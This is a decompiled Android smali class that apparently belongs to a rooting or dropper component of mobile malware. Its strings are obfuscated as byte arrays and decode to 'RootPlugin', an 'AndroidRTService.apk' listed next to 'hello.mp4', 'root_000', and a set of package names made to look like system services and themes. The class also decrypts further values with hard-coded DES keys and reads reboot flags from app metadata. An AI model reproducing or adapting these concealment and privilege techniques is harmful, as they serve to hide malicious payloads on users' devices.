.class public Lcom/test/NewC;
.super Ljava/lang/Thread;


# static fields
.field private static newa:Ljava/lang/String;

.field private static new_b:Ljava/lang/String;

.field private static newc:Ljava/lang/String;

.field private static newd:Ljava/lang/String;

.field private static e:Ljava/util/List;

.field private static newf:Ljava/lang/String;

.field private static newg:Ljava/lang/String;

.field private static newh:Ljava/lang/String;

.field private static i:Ljava/util/Set;

.field private static j:Ljava/lang/String;

.field private static new_k:Ljava/lang/String;

.field private static new_l:Ljava/lang/String;


# instance fields
.field private m:La/a/a;

.field private n:Ljava/lang/String;

.field private o:Z

.field private p:Z

.field private q:Z

.field private r:Z

.field private s:Z

.field private t:Z


# direct methods
.method static constructor <clinit>()V
    .registers 7

    const/16 v6, 0x22

    const/16 v5, 0x20

    const/16 v4, 0x1e

    const/16 v3, 0x1d

    const/16 v2, 0x1c

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->new_a:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->new_b:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->newc:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->newd:Ljava/lang/String;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/test/NewC;->e:Ljava/util/List;

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->newf:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->newg:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/test/NewC;->newh:Ljava/lang/String;

    new-instance v0, Ljava/util/HashSet;

    invoke-direct {v0}, Ljava/util/HashSet;-><init>()V

    sput-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_1da

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->new_a:Ljava/lang/String;

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_1e4

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->new_b:Ljava/lang/String;

    const/16 v0, 0x14

    new-array v0, v0, [B

    fill-array-data v0, :array_1ee

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newc:Ljava/lang/String;

    const/16 v0, 0x8

    new-array v0, v0, [B

    fill-array-data v0, :array_1fc

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newd:Ljava/lang/String;

    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_204

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newf:Ljava/lang/String;

    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_20e

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newg:Ljava/lang/String;

    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_218

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newh:Ljava/lang/String;

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    const/16 v1, 0x14

    new-array v1, v1, [B

    fill-array-data v1, :array_224

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v2, [B

    fill-array-data v1, :array_232

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v2, [B

    fill-array-data v1, :array_244

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v5, [B

    fill-array-data v1, :array_256

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    const/16 v1, 0x1b

    new-array v1, v1, [B

    fill-array-data v1, :array_26a

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v2, [B

    fill-array-data v1, :array_27c

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v3, [B

    fill-array-data v1, :array_28e

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v4, [B

    fill-array-data v1, :array_2a2

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v3, [B

    fill-array-data v1, :array_2b6

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v4, [B

    fill-array-data v1, :array_2ca

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v6, [B

    fill-array-data v1, :array_2de

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    const/16 v1, 0x1b

    new-array v1, v1, [B

    fill-array-data v1, :array_2f4

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v2, [B

    fill-array-data v1, :array_306

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v3, [B

    fill-array-data v1, :array_318

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v4, [B

    fill-array-data v1, :array_32c

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    const/16 v1, 0x1a

    new-array v1, v1, [B

    fill-array-data v1, :array_340

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v5, [B

    fill-array-data v1, :array_352

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v5, [B

    fill-array-data v1, :array_366

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v6, [B

    fill-array-data v1, :array_37a

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->i:Ljava/util/Set;

    new-array v1, v6, [B

    fill-array-data v1, :array_390

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->e:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_3a6

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->j:Ljava/lang/String;

    const/4 v0, 0x7

    new-array v0, v0, [B

    fill-array-data v0, :array_3ae

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->new_k:Ljava/lang/String;

    const/16 v0, 0x8

    new-array v0, v0, [B

    fill-array-data v0, :array_3b6

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->new_l:Ljava/lang/String;

    return-void

    :array_1da
    .array-data 1
        0x52t
        0x6ft
        0x6ft
        0x74t
        0x50t
        0x6ct
        0x75t
        0x67t
        0x69t
        0x6et
    .end array-data

    nop

    :array_1e4
    .array-data 1
        0x68t
        0x65t
        0x6ct
        0x6ct
        0x6ft
        0x2et
        0x6dt
        0x70t
        0x34t
    .end array-data

    nop

    :array_1ee
    .array-data 1
        0x41t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x52t
        0x54t
        0x53t
        0x65t
        0x72t
        0x76t
        0x69t
        0x63t
        0x65t
        0x2et
        0x61t
        0x70t
        0x6bt
    .end array-data

    :array_1fc
    .array-data 1
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x30t
    .end array-data

    :array_204
    .array-data 1
        0x36t
        0x66t
        0x39t
        0x35t
        0x52t
        0x3at
        0x54t
        0x32t
        0x39t
        0x71t
        0x31t
    .end array-data

    :array_20e
    .array-data 1
        0x61t
        0x31t
        0x66t
        0x36t
        0x52t
        0x3at
        0x54t
        0x75t
        0x39t
        0x71t
        0x38t
    .end array-data

    :array_218
    .array-data 1
        0x31t
        0x34t
        0x37t
        0x41t
        0x46t
        0x31t
        0x41t
        0x31t
        0x44t
        0x44t
        0x36t
        0x33t
        0x35t
        0x35t
        0x41t
        0x39t
    .end array-data

    :array_224
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
    .end array-data

    :array_232
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    :array_244
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    :array_256
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x67t
        0x6ft
        0x6ft
        0x67t
        0x6ct
        0x65t
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x76t
        0x6ft
        0x69t
        0x63t
        0x65t
        0x2et
        0x73t
        0x65t
        0x72t
        0x76t
        0x69t
        0x63t
        0x65t
    .end array-data

    :array_26a
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x6dt
        0x74t
        0x70t
        0x2et
        0x65t
        0x78t
        0x74t
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    :array_27c
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x6ct
        0x61t
        0x75t
        0x6et
        0x63t
        0x68t
        0x65t
        0x72t
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    :array_28e
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x73t
        0x69t
        0x6ft
        0x6et
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    nop

    :array_2a2
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x65t
        0x78t
        0x74t
        0x2et
        0x62t
        0x61t
        0x63t
        0x6bt
        0x75t
        0x70t
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    nop

    :array_2b6
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x6dt
        0x65t
        0x64t
        0x69t
        0x61t
        0x74t
        0x65t
        0x6bt
        0x2et
        0x74t
        0x68t
        0x65t
        0x6dt
        0x65t
        0x2et
        0x6dt
        0x69t
        0x6et
        0x74t
        0x2et
        0x73t
        0x74t
        0x79t
        0x6ct
        0x65t
    .end array-data

    nop

    :array_2ca
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x6dt
        0x65t
        0x64t
        0x69t
        0x61t
        0x74t
        0x65t
        0x6bt
        0x2et
        0x74t
        0x68t
        0x65t
        0x6dt
        0x65t
        0x2et
        0x6dt
        0x6ft
        0x63t
        0x68t
        0x61t
        0x2et
        0x73t
        0x74t
        0x79t
        0x6ct
        0x65t
    .end array-data

    nop

    :array_2de
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x6dt
        0x65t
        0x64t
        0x69t
        0x61t
        0x74t
        0x65t
        0x6bt
        0x2et
        0x74t
        0x68t
        0x65t
        0x6dt
        0x65t
        0x2et
        0x72t
        0x61t
        0x73t
        0x70t
        0x62t
        0x65t
        0x72t
        0x72t
        0x79t
        0x2et
        0x73t
        0x74t
        0x79t
        0x6ct
        0x65t
    .end array-data

    nop

    :array_2f4
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x6dt
        0x74t
        0x70t
        0x2et
        0x65t
        0x78t
        0x74t
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    :array_306
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x6ct
        0x61t
        0x75t
        0x6et
        0x63t
        0x68t
        0x65t
        0x72t
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    :array_318
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x73t
        0x69t
        0x6ft
        0x6et
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    nop

    :array_32c
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x65t
        0x78t
        0x74t
        0x2et
        0x62t
        0x61t
        0x63t
        0x6bt
        0x75t
        0x70t
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    nop

    :array_340
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
        0x2et
        0x74t
        0x68t
        0x65t
        0x6dt
        0x65t
    .end array-data

    nop

    :array_352
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x67t
        0x6ft
        0x6ft
        0x67t
        0x6ct
        0x65t
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x76t
        0x6ft
        0x69t
        0x63t
        0x65t
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    :array_366
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x67t
        0x6ft
        0x6ft
        0x67t
        0x6ct
        0x65t
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x76t
        0x6ft
        0x69t
        0x63t
        0x65t
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    :array_37a
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x77t
        0x61t
        0x6ct
        0x6ct
        0x70t
        0x61t
        0x70t
        0x65t
        0x72t
        0x2et
        0x68t
        0x6ft
        0x6ct
        0x6ft
        0x2et
        0x63t
        0x6ft
        0x6et
        0x66t
        0x69t
        0x72t
        0x6dt
    .end array-data

    nop

    :array_390
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x77t
        0x61t
        0x6ct
        0x6ct
        0x70t
        0x61t
        0x70t
        0x65t
        0x72t
        0x2et
        0x68t
        0x6ft
        0x6ct
        0x6ft
        0x2et
        0x73t
        0x65t
        0x74t
        0x74t
        0x69t
        0x6et
        0x67t
    .end array-data

    nop

    :array_3a6
    .array-data 1
        0x69t
        0x73t
        0x44t
        0x6ft
        0x6et
        0x65t
    .end array-data

    nop

    :array_3ae
    .array-data 1
        0x69t
        0x73t
        0x44t
        0x6ft
        0x69t
        0x6et
        0x67t
    .end array-data

    :array_3b6
    .array-data 1
        0x69t
        0x73t
        0x52t
        0x65t
        0x62t
        0x6ft
        0x6ft
        0x74t
    .end array-data
.end method

.method public constructor <init>(La/a/a;)V
    .registers 4

    const/4 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    iput-boolean v1, p0, Lcom/test/NewC;->o:Z

    invoke-static {}, La/a/e/e;->a()Z

    move-result v0

    iput-boolean v0, p0, Lcom/test/NewC;->p:Z

    iput-boolean v1, p0, Lcom/test/NewC;->q:Z

    iput-boolean v1, p0, Lcom/test/NewC;->r:Z

    iput-boolean v1, p0, Lcom/test/NewC;->s:Z

    iput-boolean v1, p0, Lcom/test/NewC;->t:Z

    iput-object p1, p0, Lcom/test/NewC;->m:La/a/a;

    if-eqz p1, :cond_2d

    invoke-virtual {p1}, La/a/a;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    :goto_29
    invoke-direct {p0}, Lcom/test/NewC;->a()V

    return-void

    :cond_2d
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    goto :goto_29
.end method

.method private static a([B)Ljava/lang/String;
    .registers 2

    if-nez p0, :cond_5

    const-string v0, ""

    :goto_4
    return-object v0

    :cond_5
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, p0}, Ljava/lang/String;-><init>([B)V

    goto :goto_4
.end method

.method private a()V
    .registers 6

    const/4 v4, 0x1

    :try_start_1
    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, ""

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_f0

    invoke-static {v2}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-static {v2}, Lcom/test/Hello;->a([B)Ljava/security/Key;

    move-result-object v2

    const-string v3, "DES"

    invoke-static {v1, v2, v3}, Lcom/test/Hello;->a(Ljava/lang/String;Ljava/security/Key;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, La/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    invoke-virtual {v0}, La/a/a;->e()V
    :try_end_26
    .catch Ljava/security/InvalidKeyException; {:try_start_1 .. :try_end_26} :catch_ba
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_1 .. :try_end_26} :catch_c2
    .catch Ljava/security/spec/InvalidKeySpecException; {:try_start_1 .. :try_end_26} :catch_ca

    :goto_26
    const/16 v0, 0x20

    :try_start_28
    new-array v0, v0, [B

    fill-array-data v0, :array_f8

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_10c

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v1}, Lcom/test/Hello;->a([B)Ljava/security/Key;

    move-result-object v1

    const-string v2, "DES"

    invoke-static {v0, v1, v2}, Lcom/test/Hello;->a(Ljava/lang/String;Ljava/security/Key;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newg:Ljava/lang/String;

    const/16 v0, 0x20

    new-array v0, v0, [B

    fill-array-data v0, :array_114

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_128

    invoke-static {v1}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v1}, Lcom/test/Hello;->a([B)Ljava/security/Key;

    move-result-object v1

    const-string v2, "DES"

    invoke-static {v0, v1, v2}, Lcom/test/Hello;->a(Ljava/lang/String;Ljava/security/Key;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/test/NewC;->newf:Ljava/lang/String;
    :try_end_72
    .catch Ljava/security/InvalidKeyException; {:try_start_28 .. :try_end_72} :catch_d2
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_28 .. :try_end_72} :catch_d9
    .catch Ljava/security/spec/InvalidKeySpecException; {:try_start_28 .. :try_end_72} :catch_e0

    :goto_72
    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    invoke-virtual {v0}, La/a/a;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    if-eqz v0, :cond_b9

    const/4 v1, 0x0

    :try_start_7b
    iget-object v2, p0, Lcom/test/NewC;->m:La/a/a;

    invoke-virtual {v2}, La/a/a;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0x80

    invoke-virtual {v0, v2, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
    :try_end_86
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_7b .. :try_end_86} :catch_e7

    move-result-object v0

    :goto_87
    if-eqz v0, :cond_b9

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    if-eqz v0, :cond_b9

    const-string v1, "RPREBOOT"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_a3

    const-string v2, "RPTRUE"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_a3

    iput-boolean v4, p0, Lcom/test/NewC;->q:Z

    :cond_a3
    const-string v1, "RPMORE"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_b9

    const-string v1, "RPTRUE"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b9

    iput-boolean v4, p0, Lcom/test/NewC;->r:Z

    :cond_b9
    return-void

    :catch_ba
    move-exception v0

    const-string v1, ""

    invoke-static {v1, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_26

    :catch_c2
    move-exception v0

    const-string v1, ""

    invoke-static {v1, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_26

    :catch_ca
    move-exception v0

    const-string v1, ""

    invoke-static {v1, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_26

    :catch_d2
    move-exception v0

    const-string v1, ""

    invoke-static {v1, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_72

    :catch_d9
    move-exception v0

    const-string v1, ""

    invoke-static {v1, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_72

    :catch_e0
    move-exception v0

    const-string v1, ""

    invoke-static {v1, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_72

    :catch_e7
    move-exception v0

    const-string v2, ""

    invoke-static {v2, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V

    move-object v0, v1

    goto :goto_87

    nop

    :array_f0
    .array-data 1
        0x73t
        0x41t
        0x26t
        0x73t
        0x32t
        0x76t
        0x24t
        0x31t
    .end array-data

    :array_f8
    .array-data 1
        0x30t
        0x41t
        0x30t
        0x43t
        0x42t
        0x34t
        0x41t
        0x31t
        0x36t
        0x46t
        0x33t
        0x38t
        0x46t
        0x39t
        0x32t
        0x34t
        0x44t
        0x33t
        0x33t
        0x43t
        0x41t
        0x39t
        0x30t
        0x41t
        0x33t
        0x46t
        0x43t
        0x30t
        0x34t
        0x41t
        0x41t
        0x45t
    .end array-data

    :array_10c
    .array-data 1
        0x73t
        0x41t
        0x26t
        0x73t
        0x32t
        0x76t
        0x24t
        0x31t
    .end array-data

    :array_114
    .array-data 1
        0x31t
        0x41t
        0x37t
        0x46t
        0x37t
        0x41t
        0x38t
        0x31t
        0x34t
        0x33t
        0x46t
        0x46t
        0x30t
        0x41t
        0x31t
        0x31t
        0x44t
        0x33t
        0x33t
        0x43t
        0x41t
        0x39t
        0x30t
        0x41t
        0x33t
        0x46t
        0x43t
        0x30t
        0x34t
        0x41t
        0x41t
        0x45t
    .end array-data

    :array_128
    .array-data 1
        0x73t
        0x41t
        0x26t
        0x73t
        0x32t
        0x76t
        0x24t
        0x31t
    .end array-data
.end method

